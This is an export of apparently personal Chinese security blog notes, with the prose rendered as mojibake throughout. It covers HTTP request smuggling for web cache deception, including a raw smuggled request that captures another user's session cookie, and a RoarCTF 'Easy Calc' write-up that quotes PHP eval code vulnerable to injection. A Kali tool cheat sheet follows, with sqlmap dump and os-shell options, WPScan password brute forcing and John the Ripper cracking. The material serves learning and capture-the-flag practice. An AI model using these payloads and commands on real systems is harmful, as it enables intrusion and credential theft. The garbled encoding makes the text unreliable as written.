<h2 id="ä½¿ç”¨-HTTP-è¯·æ±‚èµ°ç§æ‰§è¡Œ-Web-ç¼“å­˜æ¬ºéª—"><a href="#ä½¿ç”¨-HTTP-è¯·æ±‚èµ°ç§æ‰§è¡Œ-Web-ç¼“å­˜æ¬ºéª—" class="headerlink" title="ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§æ‰§è¡Œ Web ç¼“å­˜æ¬ºéª—"></a>ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§æ‰§è¡Œ Web ç¼“å­˜æ¬ºéª—</h2><p>åœ¨æ”»å‡»çš„å¦ä¸€ç§å˜ä½“ä¸­ï¼Œ å¯ä»¥åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§æ¥æ‰§è¡Œ Web ç¼“å­˜æ¬ºéª—ã€‚å…¶å·¥ä½œæ–¹å¼ä¸ Web ç¼“å­˜ä¸­æ¯’æ”»å‡»ç±»ä¼¼ï¼Œä½†ç›®çš„ä¸åŒã€‚<br>Web ç¼“å­˜ä¸­æ¯’å’Œ Web ç¼“å­˜æ¬ºéª—æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p>
<ul>
<li>åœ¨ Web ç¼“å­˜ä¸­æ¯’ä¸­ï¼Œæ”»å‡»è€…ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨ä¸€äº›æ¶æ„å†…å®¹ï¼Œå¹¶å°†è¿™äº›å†…å®¹ä»ç¼“å­˜æä¾›ç»™å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚</li>
<li>åœ¨ Web ç¼“å­˜æ¬ºéª—ä¸­ï¼Œæ”»å‡»è€…ä½¿åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨ä¸€äº›å±äºå…¶ä»–ç”¨æˆ·çš„æ•æ„Ÿå†…å®¹ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢è¿™äº›å†…å®¹ã€‚<br>åœ¨æ­¤å˜ä½“ä¸­ï¼Œæ”»å‡»è€…èµ°ç§ä¸€ä¸ªè¯·æ±‚ï¼Œè¯¥è¯·æ±‚è¿”å›ä¸€äº›æ•æ„Ÿçš„ç”¨æˆ·ç‰¹å®šå†…å®¹ã€‚ä¾‹å¦‚</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>43</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/private/messages</span> HTTP<span class="symbol">/1.1</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Foo:</span> X</span></span><br></pre></td></tr></table></figure></div>
<p>æ¥è‡ªå¦ä¸€ä¸ªç”¨æˆ·è½¬å‘åˆ°åç«¯æœåŠ¡å™¨çš„ä¸‹ä¸€ä¸ªè¯·æ±‚å°†é™„åŠ åˆ°èµ°ç§è¯·æ±‚ä¸­ï¼ŒåŒ…æ‹¬ä¼šè¯ Cookie å’Œå…¶ä»–æ ‡å¤´ã€‚ä¾‹å¦‚ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">GET <span class="symbol">/private/messages</span> HTTP<span class="symbol">/1.1</span></span><br><span class="line"><span class="params">Foo:</span> XGET <span class="symbol">/static/some-image.png</span> HTTP<span class="symbol">/1.1</span></span><br><span class="line"><span class="params">Host:</span> vulnerable-website.com</span><br><span class="line"><span class="params">Cookie:</span> sessionId<span class="operator">=</span>q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„ä¸€ä¸ªé‡è¦é—®é¢˜æ˜¯ï¼Œæ”»å‡»è€…ä¸çŸ¥é“ç¼“å­˜æ•æ„Ÿå†…å®¹æ‰€é’ˆå¯¹çš„ URLï¼Œå› ä¸ºè¿™å°†æ˜¯å—å®³ç”¨æˆ·åœ¨èµ°ç§è¯·æ±‚ç”Ÿæ•ˆæ—¶ç¢°å·§è¯·æ±‚çš„ä»»ä½• URLã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦è·å–å¤§é‡é™æ€ URL æ‰èƒ½å‘ç°æ•è·çš„å†…å®¹ã€‚</p>
<h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a><code>[RoarCTF 2019]Easy Calc</code></h2><p>æŸ¥çœ‹ä¸€ä¸‹é¡µé¢æºä»£ç <br><img src="https://pic1.imgdb.cn/item/67dc2fb688c538a9b5c2184d.png"><br>è¿™é‡Œæœ‰å‡ºç°ä¸€ä¸ªcalc.phpçš„é¡µé¢æç¤ºï¼Œè®¿é—®ä¹‹åå¾—åˆ°æºç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯éšä¾¿è¾“å…¥ä¸€ç‚¹æ•°æ®ä¹‹åï¼Œå‘ç°ä¸åªæ˜¯è¿™äº›å­—ç¬¦è¢«è¿‡æ»¤äº†ï¼Œå­—æ¯ä¹Ÿè¢«è¿‡æ»¤äº†<br>è¿™é‡Œå°±å¯ä»¥ç”¨httpè¯·æ±‚èµ°ç§æ¼æ´ï¼Œè®©é¡µé¢æ”¶åˆ°ä¸¤ä¸ªè¯·æ±‚,ä»»æ„ç±»å‹çš„éƒ½å¯ä»¥ï¼Œåªè¦è®©é¡µé¢æŠ¥é”™å°±å¯ä»¥<br><img src="https://pic1.imgdb.cn/item/67dc324088c538a9b5c218c0.png"><br>ä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°disable_functions å¯ä»¥çœ‹åˆ°ç¦äº†å¾ˆå¤šå‡½æ•°ï¼Œä½†æ˜¯phpè¿˜æ˜¯æœ‰å¾ˆå¤šå‡½æ•°å¯ä»¥ç”¨å¯ä»¥å…ˆç”¨scandirçœ‹å½“å‰ç›®å½•çš„æ–‡ä»¶<br>å› ä¸ºè¿‡æ»¤äº†&#x2F; æ‰€ä»¥ç”¨chrè½¬ä¸€ä¸‹<br><img src="https://pic1.imgdb.cn/item/67dc344688c538a9b5c21917.png"><br>æœ€åç”¨file_get_contentsæˆ–è€…show_sourceå‡½æ•°çœ‹flag</p>
]]></content>
      <categories>
        <category>æ¼æ´</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ç¬”è®°</tag>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliå·¥å…·ç¬”è®°</title>
    <url>/posts/15173.html</url>
    <content><![CDATA[<p>kaliå·¥å…·ç¬”è®°</p>
<span id="more"></span>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>Nmap æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ç«¯å£æ‰«æå·¥å…·ï¼Œé»˜è®¤æ‰«æç«¯å£èŒƒå›´ 1-1024ã€‚</p>
<h3 id="å¸¸ç”¨å‚æ•°"><a href="#å¸¸ç”¨å‚æ•°" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>-sn</code> æˆ– <code>-sP</code></td>
<td>è¿›è¡Œä¸»æœºæ¢æµ‹ï¼ˆPing æ‰«æï¼‰ã€‚</td>
</tr>
<tr>
<td>æ— å‚æ•°</td>
<td>æ›´è¯¦ç»†çš„æ‰«æï¼Œå¯ä»¥è·å–ç«¯å£ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><code>-p-</code></td>
<td>æ‰«ææ‰€æœ‰ç«¯å£ï¼ˆæœ‰æ—¶ Ping ä¸ä¸€å®šèƒ½æ‰«å‡ºï¼‰ã€‚</td>
</tr>
<tr>
<td><code>-p &lt;ç«¯å£&gt;</code></td>
<td>æŒ‡å®šç«¯å£æ‰«æï¼Œå¯ä¸ <code>--script=banner</code> æˆ– <code>-A</code> ç»“åˆä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td><code>-sU</code></td>
<td>æ‰«æ UDP ç«¯å£ï¼Œæ¢æµ‹ç›®æ ‡ä¸Šçš„æœåŠ¡ã€‚</td>
</tr>
<tr>
<td><code>-A</code></td>
<td>å¯ç”¨é«˜çº§æ£€æµ‹ï¼ŒåŒ…æ‹¬æ“ä½œç³»ç»Ÿæ£€æµ‹ã€ç‰ˆæœ¬æ£€æµ‹ã€è„šæœ¬æ‰«æå’Œè·¯ç”±è·Ÿè¸ªã€‚</td>
</tr>
<tr>
<td><code>-sS</code></td>
<td>è¿›è¡ŒåŠå¼€æ”¾å¼ï¼ˆSYNï¼‰æ‰«æï¼Œé€‚ç”¨äºå¿«é€Ÿç«¯å£æ‰«æã€‚</td>
</tr>
<tr>
<td><code>-sT</code></td>
<td>è¿›è¡Œå®Œæ•´è¿æ¥ï¼ˆTCP è¿æ¥ï¼‰æ‰«æï¼Œé€‚ç”¨äºæ²¡æœ‰ç‰¹æƒçš„ç”¨æˆ·ã€‚</td>
</tr>
<tr>
<td><code>-sV</code></td>
<td>æ¢æµ‹ç«¯å£æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><code>-O</code></td>
<td>è¿›è¡Œæ“ä½œç³»ç»Ÿæ£€æµ‹ã€‚</td>
</tr>
<tr>
<td><code>--script=&lt;è„šæœ¬&gt;</code></td>
<td>ä½¿ç”¨ Nmap è„šæœ¬å¼•æ“ï¼ˆNSEï¼‰ï¼Œå¦‚ <code>--script=vuln</code> è¿›è¡Œæ¼æ´æ‰«æã€‚</td>
</tr>
<tr>
<td><code>-T&lt;0-5&gt;</code></td>
<td>è®¾ç½®æ‰«æé€Ÿåº¦ï¼Œ<code>T0</code> æœ€æ…¢ï¼Œ<code>T5</code> æœ€å¿«ã€‚</td>
</tr>
<tr>
<td><code>-Pn</code></td>
<td>è·³è¿‡ Ping æ£€æµ‹ï¼Œç›´æ¥æ‰«æç›®æ ‡ä¸»æœºï¼ˆé€‚ç”¨äºé˜²ç«å¢™å±è”½ Ping çš„æƒ…å†µï¼‰ã€‚</td>
</tr>
<tr>
<td>-p- æ‰«ææ‰€æœ‰ç«¯å£ï¼ˆæœ‰æ—¶å€™ç›´æ¥pingä¸€ä¸‹ä¸ä¸€å®šæ‰«å‡ºæ¥çš„ï¼‰ è¿™ä¸ªæœåŠ¡å’Œnmapæ‰«å‡ºæ¥çš„ä¹Ÿä¸ä¸€å®šä¸€æ ·</td>
<td></td>
</tr>
<tr>
<td>åé¢å¯ä»¥-p æŒ‡å®šç«¯å£ä¹‹å åŠ ä¸Š â€“script&#x3D;banner  æˆ–è€…-A</td>
<td></td>
</tr>
<tr>
<td>-sU å¯ä»¥æ¢æµ‹åˆ°æœåŠ¡</td>
<td></td>
</tr>
<tr>
<td>-6 ç”¨ipv6  å¯ä»¥å…ˆç”¨ping6 -I ff02::1 æ‰«æå‡ºipv6åœ°å€ï¼Œç„¶åç”¨nmap -6 [ip] -p 22  ç¡®å®šï¼Œå¤šç”¨äºç»•è¿‡22ç«¯å£çš„filter</td>
<td></td>
</tr>
</tbody></table>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>SQLMap æ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ– SQL æ³¨å…¥æ¼æ´æ£€æµ‹å·¥å…·</p>
<h3 id="å¸¸ç”¨å‚æ•°-1"><a href="#å¸¸ç”¨å‚æ•°-1" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>-u &lt;URL&gt;</code></td>
<td>æŒ‡å®šç›®æ ‡ URLï¼Œä¾‹å¦‚ <code>-u &quot;http://example.com?id=1&quot;</code>ã€‚</td>
</tr>
<tr>
<td><code>--data &quot;&lt;å‚æ•°&gt;&quot;</code></td>
<td>ç”¨äº POST è¯·æ±‚çš„å‚æ•°æ•°æ®ï¼Œä¾‹å¦‚ <code>--data &quot;user=admin&amp;pass=123&quot;</code>ã€‚</td>
</tr>
<tr>
<td><code>--cookie &quot;&lt;cookie&gt;&quot;</code></td>
<td>æŒ‡å®šè¯·æ±‚çš„ Cookieï¼Œä¾‹å¦‚ <code>--cookie &quot;PHPSESSID=12345&quot;</code>ã€‚</td>
</tr>
<tr>
<td><code>-p &lt;å‚æ•°&gt;</code></td>
<td>æŒ‡å®šæµ‹è¯•çš„å‚æ•°ï¼Œä¾‹å¦‚ <code>-p id</code> åªæµ‹è¯• <code>id</code> å‚æ•°ã€‚</td>
</tr>
<tr>
<td><code>--level=&lt;1-5&gt;</code></td>
<td>è®¾ç½®æµ‹è¯•å¼ºåº¦ï¼Œé»˜è®¤ <code>1</code>ï¼Œ<code>5</code> æœ€å½»åº•ä½†è¾ƒæ…¢ã€‚</td>
</tr>
<tr>
<td><code>--risk=&lt;1-3&gt;</code></td>
<td>è®¾ç½®é£é™©çº§åˆ«ï¼Œ<code>1</code> ä¸ºä½ï¼Œ<code>3</code> ä¸ºé«˜ã€‚</td>
</tr>
<tr>
<td><code>--dbs</code></td>
<td>æšä¸¾ç›®æ ‡æ•°æ®åº“åç§°ã€‚</td>
</tr>
<tr>
<td><code>--tables</code></td>
<td>åˆ—å‡ºç›®æ ‡æ•°æ®åº“ä¸­çš„è¡¨ï¼Œéœ€è¦ç»“åˆ <code>-D &lt;æ•°æ®åº“å&gt;</code> ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td><code>--columns</code></td>
<td>åˆ—å‡ºè¡¨ä¸­çš„åˆ—åï¼Œéœ€è¦ç»“åˆ <code>-D &lt;æ•°æ®åº“å&gt; -T &lt;è¡¨å&gt;</code> ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td><code>--dump</code></td>
<td>å¯¼å‡ºè¡¨ä¸­çš„æ•°æ®ï¼Œéœ€è¦ç»“åˆ <code>-D &lt;æ•°æ®åº“å&gt; -T &lt;è¡¨å&gt;</code> ä½¿ç”¨ã€‚</td>
</tr>
<tr>
<td><code>--batch</code></td>
<td>è·³è¿‡äº¤äº’æç¤ºï¼Œè‡ªåŠ¨é€‰æ‹©é»˜è®¤é€‰é¡¹ï¼Œé€‚ç”¨äºè„šæœ¬åŒ–æ“ä½œã€‚</td>
</tr>
<tr>
<td><code>--threads &lt;N&gt;</code></td>
<td>è®¾ç½®æ‰«æçº¿ç¨‹æ•°ï¼Œæé«˜æ‰«æé€Ÿåº¦ï¼ˆé»˜è®¤ä¸º <code>1</code>ï¼Œå»ºè®® <code>3-5</code>ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>--os-shell</code></td>
<td>è·å–æ“ä½œç³»ç»Ÿ Shellï¼ˆå¦‚æœç›®æ ‡æ•°æ®åº“å…·æœ‰å‘½ä»¤æ‰§è¡Œæƒé™ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>--tamper &lt;è„šæœ¬&gt;</code></td>
<td>ä½¿ç”¨ <code>tamper</code> è„šæœ¬ï¼ˆå¦‚ <code>--tamper=space2comment</code>ï¼‰ç»•è¿‡æŸäº›å®‰å…¨é˜²æŠ¤ã€‚</td>
</tr>
</tbody></table>
<h3 id="ä½¿ç”¨ç¤ºä¾‹"><a href="#ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> <span class="comment">--dbs</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db <span class="comment">--tables</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db -T users <span class="comment">--columns</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db -T users -C xxxx <span class="comment">--dump</span></span><br></pre></td></tr></table></figure></div>
<h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h2><p>åœ¨ Kali Linux ä¸­ï¼Œ<strong>John the Ripper</strong> æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å¯†ç ç ´è§£å·¥å…·ï¼Œç”¨äºæµ‹è¯•å¯†ç å¼ºåº¦</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">john [é€‰é¡¹] <span class="tag">&lt;<span class="name">æ–‡ä»¶</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>â€“wordlist&#x3D;&lt;æ–‡ä»¶&gt;ï¼šæŒ‡å®šå¯†ç å­—å…¸ã€‚<br>é»˜è®¤å­—å…¸ä½ç½®ï¼š&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<br>ç ´è§£ç»“æœå­˜å‚¨åœ¨ ~&#x2F;.john&#x2F;john.potã€‚</p>
<h3 id="å¸¸ç”¨å‚æ•°-2"><a href="#å¸¸ç”¨å‚æ•°-2" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>--wordlist=&lt;æ–‡ä»¶&gt;</code></td>
<td>ä½¿ç”¨æŒ‡å®šçš„å¯†ç å­—å…¸è¿›è¡Œç ´è§£ã€‚</td>
</tr>
<tr>
<td><code>--rules</code></td>
<td>å¯ç”¨è§„åˆ™æ‰©å±•ï¼ˆå¯¹å­—å…¸è¿›è¡Œå˜å½¢ï¼Œæé«˜æˆåŠŸç‡ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>--format=&lt;æ ¼å¼&gt;</code></td>
<td>æŒ‡å®šå“ˆå¸Œæ ¼å¼ï¼Œå¦‚ <code>md5crypt</code>ã€<code>sha512crypt</code>ã€<code>nt</code>ã€<code>zip</code>ã€‚</td>
</tr>
<tr>
<td><code>--show</code></td>
<td>æ˜¾ç¤ºå·²ç ´è§£çš„å¯†ç ã€‚</td>
</tr>
<tr>
<td><code>--incremental</code></td>
<td>ä½¿ç”¨å¢é‡æ¨¡å¼ï¼ˆè‡ªåŠ¨ç”Ÿæˆå€™é€‰å¯†ç ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>--session=&lt;åç§°&gt;</code></td>
<td>æŒ‡å®šä¼šè¯åç§°ï¼Œå¯æš‚åœåç»­ç»§ç»­ç ´è§£ã€‚</td>
</tr>
<tr>
<td><code>--restore=&lt;åç§°&gt;</code></td>
<td>æ¢å¤æŒ‡å®šä¼šè¯çš„ç ´è§£è¿›åº¦ã€‚</td>
</tr>
<tr>
<td><code>--fork=&lt;N&gt;</code></td>
<td>å¯ç”¨ <code>N</code> ä¸ªè¿›ç¨‹è¿›è¡Œå¹¶è¡Œç ´è§£ï¼Œæé«˜é€Ÿåº¦ã€‚</td>
</tr>
<tr>
<td><code>--single</code></td>
<td>ä½¿ç”¨ç”¨æˆ·åä½œä¸ºå¯†ç çš„åŸºç¡€è¿›è¡Œå•æ¨¡å¼ç ´è§£ã€‚</td>
</tr>
<tr>
<td><code>--stdout</code></td>
<td>ä»…ç”Ÿæˆå€™é€‰å¯†ç ï¼Œä¸è¿›è¡Œç ´è§£ï¼ˆæµ‹è¯•å­—å…¸æ•ˆæœï¼‰ã€‚</td>
</tr>
</tbody></table>
<h3 id="ä½¿ç”¨ç¤ºä¾‹-1"><a href="#ä½¿ç”¨ç¤ºä¾‹-1" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">john <span class="attribute">--wordlist</span>=rockyou.txt <span class="attribute">--format</span>=raw-md5 hashes.txt</span><br></pre></td></tr></table></figure></div>

<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><p><strong>WPScan</strong> æ˜¯ä¸€ä¸ªä¸“æ³¨äº WordPress å®‰å…¨æ€§çš„å¼€æºå·¥å…·ï¼Œç”¨äºæ‰«æ WordPress ç½‘ç«™çš„å®‰å…¨æ¼æ´ã€‚å®ƒå¯ä»¥å¸®åŠ©ç®¡ç†å‘˜è¯†åˆ«ç½‘ç«™ä¸­å¯èƒ½å­˜åœ¨çš„å®‰å…¨é—®é¢˜ï¼Œä¾‹å¦‚å·²çŸ¥çš„æ’ä»¶æˆ–ä¸»é¢˜æ¼æ´ã€å¼±å¯†ç ã€ä»¥åŠé”™è¯¯çš„é…ç½®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> &lt;target_url&gt; <span class="selector-attr">[é€‰é¡¹]</span></span><br></pre></td></tr></table></figure></div>
<p>ç°åœ¨éƒ½éœ€è¦åˆ°å®˜ç½‘æ³¨å†Œ ç„¶åå¾—åˆ°api-token æ‰èƒ½è·å¾—æ‰«æä¹‹åçš„è¯¦ç»†ç»“æœ</p>
<h3 id="å¸¸ç”¨å‚æ•°-3"><a href="#å¸¸ç”¨å‚æ•°-3" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td><code>--url &lt;URL&gt;</code></td>
<td>æŒ‡å®šç›®æ ‡ç½‘ç«™çš„ URLã€‚</td>
</tr>
<tr>
<td><code>--enumerate &lt;OPTION&gt;</code></td>
<td>æšä¸¾ WordPress çš„ç”¨æˆ·ã€æ’ä»¶ã€ä¸»é¢˜ç­‰ï¼ˆè¯¦ç»†é€‰é¡¹è§ä¸‹æ–¹ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>--api-token &lt;TOKEN&gt;</code></td>
<td>ä½¿ç”¨ WPScan API Token è·å–æ›´è¯¦ç»†çš„æ¼æ´æ•°æ®ã€‚</td>
</tr>
<tr>
<td><code>--random-user-agent</code></td>
<td>ä½¿ç”¨éšæœºçš„ User-Agent æ¨¡æ‹ŸçœŸå®ç”¨æˆ·è®¿é—®ï¼Œé¿å…è¢«ç›®æ ‡ç½‘ç«™å±è”½ã€‚</td>
</tr>
<tr>
<td><code>--passwords &lt;FILE&gt;</code></td>
<td>æŒ‡å®šå¯†ç å­—å…¸æ–‡ä»¶ï¼Œç”¨äºå¯†ç æš´åŠ›ç ´è§£ã€‚</td>
</tr>
<tr>
<td><code>--usernames &lt;FILE&gt;</code></td>
<td>æŒ‡å®šç”¨æˆ·åå­—å…¸æ–‡ä»¶ï¼Œç”¨äºå¯†ç æš´åŠ›ç ´è§£ã€‚</td>
</tr>
<tr>
<td><code>--ignore-main-redirect</code></td>
<td>å¿½ç•¥ç½‘ç«™çš„ URL é‡å®šå‘ã€‚</td>
</tr>
<tr>
<td><code>--verbose</code></td>
<td>æ˜¾ç¤ºè¯¦ç»†çš„è¾“å‡ºä¿¡æ¯ã€‚</td>
</tr>
</tbody></table>
<p>é€šè¿‡ <code>--enumerate</code> å‚æ•°ï¼Œå¯ä»¥æšä¸¾ WordPress ç½‘ç«™çš„ä¸åŒç»„ä»¶ï¼š</p>
<table>
<thead>
<tr>
<th>æšä¸¾é€‰é¡¹</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td><code>u</code></td>
<td>æšä¸¾ç”¨æˆ·ï¼ˆå°è¯•æŸ¥æ‰¾ç”¨æˆ·åï¼‰ã€‚</td>
</tr>
<tr>
<td><code>p</code></td>
<td>æšä¸¾æ’ä»¶åŠå…¶æ¼æ´ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><code>t</code></td>
<td>æšä¸¾ä¸»é¢˜åŠå…¶æ¼æ´ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><code>vp</code></td>
<td>æšä¸¾æœ‰æ¼æ´çš„æ’ä»¶ï¼ˆéœ€è¦ API æ”¯æŒï¼‰ã€‚</td>
</tr>
<tr>
<td><code>vt</code></td>
<td>æšä¸¾æœ‰æ¼æ´çš„ä¸»é¢˜ï¼ˆéœ€è¦ API æ”¯æŒï¼‰ã€‚</td>
</tr>
<tr>
<td><code>ap</code></td>
<td>æ˜¾ç¤ºæ‰€æœ‰æ’ä»¶ã€‚</td>
</tr>
<tr>
<td><code>at</code></td>
<td>æ˜¾ç¤ºæ‰€æœ‰ä¸»é¢˜ã€‚</td>
</tr>
</tbody></table>
<p>å¯†ç ç ´è§£</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">wpscan <span class="params">--url</span> https:<span class="string">//example.com</span> -P passwords.txt -U users.txt</span><br></pre></td></tr></table></figure>
<h2 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h2><p><strong>WFuzz</strong> æ˜¯ä¸€æ¬¾å¼€æºçš„ Web åº”ç”¨æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œä¸“ä¸ºæ¸—é€æµ‹è¯•è®¾è®¡ã€‚å®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯é€šè¿‡æš´åŠ›ç ´è§£å’Œæ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ï¼Œæšä¸¾å’Œå‘ç° Web åº”ç”¨ä¸­çš„éšè—å†…å®¹æˆ–æ¼æ´ï¼Œæ¯”å¦‚ï¼š</p>
<ol>
<li><strong>ç›®å½•å’Œæ–‡ä»¶æšä¸¾</strong>ï¼šå‘ç°ç½‘ç«™çš„éšè—ç›®å½•æˆ–æ•æ„Ÿæ–‡ä»¶ã€‚</li>
<li><strong>å‚æ•°æšä¸¾</strong>ï¼šæµ‹è¯• Web åº”ç”¨ä¸­å¯èƒ½å­˜åœ¨çš„éšè—å‚æ•°ã€‚</li>
<li><strong>å‡­æ®çˆ†ç ´</strong>ï¼šç”¨äºæš´åŠ›ç ´è§£ç™»å½•é¡µé¢ã€‚</li>
